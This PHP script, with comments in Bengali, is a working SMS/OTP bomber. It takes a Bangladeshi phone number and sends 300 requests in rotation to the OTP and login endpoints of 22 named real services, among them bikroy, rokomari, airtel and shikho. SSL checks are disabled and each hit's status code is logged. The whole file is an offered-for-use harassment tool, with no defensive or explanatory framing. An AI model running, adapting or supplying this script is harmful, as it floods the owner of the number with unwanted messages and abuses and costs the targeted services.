<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); // ৩০০ রিকোয়েস্ট পাঠাতে সময় লাগবে তাই লিমিট অফ করা হলো

$phone = $_GET['phone'] ?? '';

// ১. ফোন নম্বর ভ্যালিডেশন
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ২. বিভিন্ন ফরম্যাটে ফোন নম্বর প্রসেসিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;

$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    
$phone_fundesh = substr($phone_11, 1);    

// ৩. এপিআই লিস্ট (তোর দেওয়া সবগুলো সার্ভিস এখানে আছে)
$api_list = [
    ["name"=>"ali2bd", "url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login", "method"=>"POST", "data"=>["username"=>$phone_11]],
    ["name"=>"hishabee", "url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88", "method"=>"POST"],
    ["name"=>"pbs", "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP", "method"=>"POST", "data"=>["userPhone"=>$phone_11]],
    ["name"=>"shadhin", "url"=>"https://connect.shadhinmusic.com/v1/api//otp/send", "method"=>"POST", "data"=>["msisdn"=>$phone_88]],
    ["name"=>"redx", "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11]],
    ["name"=>"bikroy", "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", "method"=>"GET"],
    ["name"=>"bdtickets", "url"=>"https://api.bdtickets.com/v1/auth", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"]],
    ["name"=>"shwapno", "url"=>"https://www.shwapno.com/api/auth", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88]],
    ["name"=>"garibook", "url"=>"https://api.garibookadmin.com/api/v4/user/login", "method"=>"POST", "data"=>["mobile"=>$phone_plus88,"channel"=>"web"]],
    ["name"=>"shikho", "url"=>"https://api.shikho.com/auth/v2/send/sms", "method"=>"POST", "data"=>["phone"=>$phone_88,"type"=>"student"]],
    ["name"=>"iqra", "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, "method"=>"GET"],
    ["name"=>"osudpotro", "url"=>"https://api.osudpotro.com/api/v1/users/send_otp", "method"=>"POST", "data"=>["mobile"=>$phone_osudpotro]],
    ["name"=>"chardike", "url"=>"https://api.chardike.com/api/otp/send", "method"=>"POST", "data"=>["phone"=>$phone_11, "otp_type"=>"login"]],
    ["name"=>"bohubrihi", "url"=>"https://bb-api.bohubrihi.com/public/activity/otp", "method"=>"POST", "data"=>["phone"=>$phone_11, "intent"=>"login"]],
    ["name"=>"ghoorilearning", "url"=>"https://api.ghoorilearning.com/api/auth/signup/otp", "method"=>"POST", "data"=>["mobile_no"=>$phone_11]],
    ["name"=>"rabbithole", "url"=>"https://apix.rabbitholebd.com/appv2/login/requestOTP", "method"=>"POST", "data"=>["mobile"=>"+88".$phone_11]],
    ["name"=>"rokomari", "url"=>"https://www.rokomari.com/otp/send?emailOrPhone=".$phone_88."&countryCode=BD", "method"=>"GET"],
    ["name"=>"ecourier", "url"=>"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=".$phone_11, "method"=>"GET"],
    ["name"=>"airtel", "url"=>"https://api.bd.airtel.com/v1/account/login/otp", "method"=>"POST", "data"=>["phone_number"=>$phone_11]],
    ["name"=>"eonbazar", "url"=>"https://app.eonbazar.com/api/auth/register", "method"=>"POST", "data"=>["mobile"=>$phone_11]],
    ["name"=>"ostad", "url"=>"https://api.ostad.app/api/v2/user/with-otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]],
    ["name"=>"prothomalo", "url"=>"https://prod-api.viewlift.com/identity/signup?site=prothomalo", "method"=>"POST", "data"=>["requestType"=>"send", "phoneNumber"=>$phone_plus88]]
];

// ৪. ঠিক ৩০০টি রিকোয়েস্ট পূর্ণ করার লজিক
$total_requests = 300;
$execution_queue = [];

for ($i = 0; $i < $total_requests; $i++) {
    // Modulo (%) ব্যবহার করে এপিআই গুলোকে বার বার লুপ করা হচ্ছে
    $execution_queue[] = $api_list[$i % count($api_list)];
}

// ৫. ফাইনাল এক্সিকিউশন (CURL)
$final_results = [];
foreach($execution_queue as $count => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    if(isset($api['method']) && $api['method'] === "POST"){
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type:application/json', 'User-Agent: Mozilla/5.0']);
    } else {
        curl_setopt($ch, CURLOPT_HTTPGET, true);
    }

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $final_results[] = ["hit" => $count + 1, "service" => $api['name'], "code" => $http_code];

    // স্যার যেহেতু টাইম স্লিপ নিয়ে সমস্যা নেই বলেছেন, তাই ০.২ সেকেন্ড গ্যাপ দেওয়া হলো
    usleep(200000); 
}

// ৬. আউটপুট প্রদান
echo json_encode([
    "status" => "success",
    "total_hits" => count($final_results),
    "results" => $final_results
], JSON_PRETTY_PRINT);
